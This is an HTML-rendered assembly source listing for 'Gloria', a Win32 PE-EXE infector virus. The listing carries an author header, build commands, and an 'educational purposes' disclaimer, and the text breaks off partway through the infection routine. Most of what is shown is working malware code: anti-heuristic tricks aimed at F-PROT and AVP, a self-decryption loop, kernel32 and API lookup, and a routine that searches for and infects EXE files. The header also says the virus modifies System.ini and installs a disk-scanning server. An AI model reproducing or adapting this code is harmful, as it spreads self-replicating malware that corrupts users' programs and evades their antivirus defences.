<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Gloria.2928 - GLORIA.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">; Virus:          Gloria.A</span><span class="sc0">
</span><span class="sc1">; Size:           3440 bytes</span><span class="sc0">
</span><span class="sc1">; Author:         N.B.K.   &lt;"nbk@programador.mailbr.com.br"&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is a direct action Pe-exe infector. Will infect files</span><span class="sc0">
</span><span class="sc1">; under Windows 95 (I don't know if works on NT or Win 2000)</span><span class="sc0">
</span><span class="sc1">; with extension *.EXE. After running, will modifie System.ini</span><span class="sc0">
</span><span class="sc1">; in Windows directory and Install a server that scans for</span><span class="sc0">
</span><span class="sc1">; files in all fixed disks.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetz:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Lord Julus ( good work in virus list )</span><span class="sc0">
</span><span class="sc1">; Vecna ( Thanx for help me )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And all Vx writer in "#vir" / "#virus" channels.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This code is only for educational purposes.</span><span class="sc0">
</span><span class="sc1">; Don't assembly it !!!.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Know bugs:     - Error with Winzip self-extract files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       [ This is my first virus :-) ].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm32 -ml -m gloria.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -aa -c gloria,,,import32.lib</span><span class="sc0">
</span><span class="sc1">; pewrsec gloria.exe</span><span class="sc0">


                </span><span class="sc2">.386p</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">
                </span><span class="sc5">jumps</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">my_own.inc</span><span class="sc0">

</span><span class="sc5">Gloria</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">replace_heur</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">anti_heuristic</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc1">; Generate exception, but we can handle it...</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">

        </span><span class="sc1">; F-PROT will jump "here"</span><span class="sc0">
        </span><span class="sc1">; And AVP stop scanning when saw that this</span><span class="sc0">
        </span><span class="sc1">; is the first section, named .CODE  :-)</span><span class="sc0">

        </span><span class="sc1">; restore errors        </span><span class="sc0">

</span><span class="sc5">anti_heuristic</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc1">; edi = offset for encrypted code</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">replace_addr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dummy</span><span class="sc0">

        </span><span class="sc1">; code lenght</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_crypt</span><span class="sc0">

</span><span class="sc5">loop_decrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">96291273h</span><span class="sc0">
</span><span class="sc5">key_dword2</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_decrypt</span><span class="sc0">

        </span><span class="sc1">; get delta offset</span><span class="sc0">

</span><span class="sc5">area_crypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">

</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">

        </span><span class="sc1">; try windows 95 kernel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0BFF70000h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">krnl_found</span><span class="sc0">

        </span><span class="sc1">; try windows NT kernel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">077F00000h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">krnl_found</span><span class="sc0">

        </span><span class="sc1">; try windows 2000 kernel (Thanx Vecna)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">077e00000h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unknow_os</span><span class="sc0">

</span><span class="sc5">krnl_found</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">kernel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">getprocaddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; retrieve GetProcAddress (engine from Lord Julus)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_GetProc</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">unknow_os</span><span class="sc0">

        </span><span class="sc1">; locate api address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_api</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">key_dword</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; get a random number</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; rotate new key</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc1">; and fix it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_dword2</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCommandLineA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">

        </span><span class="sc1">; We need  to stay in net mode ?</span><span class="sc0">

</span><span class="sc5">_scan</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"bteN"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">net_mode</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_scan</span><span class="sc0">

        </span><span class="sc1">; restore values used to back to host</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">reset_var</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files_infect</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; infect current directory</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_one</span><span class="sc0">

        </span><span class="sc1">; Install checker</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_install_net</span><span class="sc0">

        </span><span class="sc1">; exit virus code</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Gloria_exit</span><span class="sc0">

</span><span class="sc5">infect_one</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">stringexe</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; insert \*.EXE to path</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">_@@2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@@2</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_find</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ret_infect_loop</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_@@3</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@@3</span><span class="sc0">

        </span><span class="sc1">; subtract *.EXE,0 string</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; add filename to path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_loop@</span><span class="sc0">

</span><span class="sc5">infect_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_@1@</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@1@</span><span class="sc0">

        </span><span class="sc1">; find last "\"</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">_@2@</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_@2@</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; And replace filename</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">infect_loop@</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">_@_1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@_1</span><span class="sc0">

        </span><span class="sc1">; set direction flag to go back to "\"</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">_@_2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_@_2</span><span class="sc0">

        </span><span class="sc1">; clear direction flag to avoid future errors</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; check file name</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">chk_fl_name</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">check_how</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_file_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">good_size</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">attr_res</span><span class="sc0">

</span><span class="sc5">good_size</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mapp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">attr_res</span><span class="sc0">

        </span><span class="sc1">; check PE header</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_cod</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">unmap_attr</span><span class="sc0">

        </span><span class="sc1">; close file</span><span class="sc0">

</span><span class="sc5">good_entry</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],(</span><span class="sc5">vir_size</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc1">; open with virus size * 2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mapp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">attr_res</span><span class="sc0">

        </span><span class="sc1">; call infection routine</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">physicalsize</span><span class="sc4">]</span><span class="sc0">
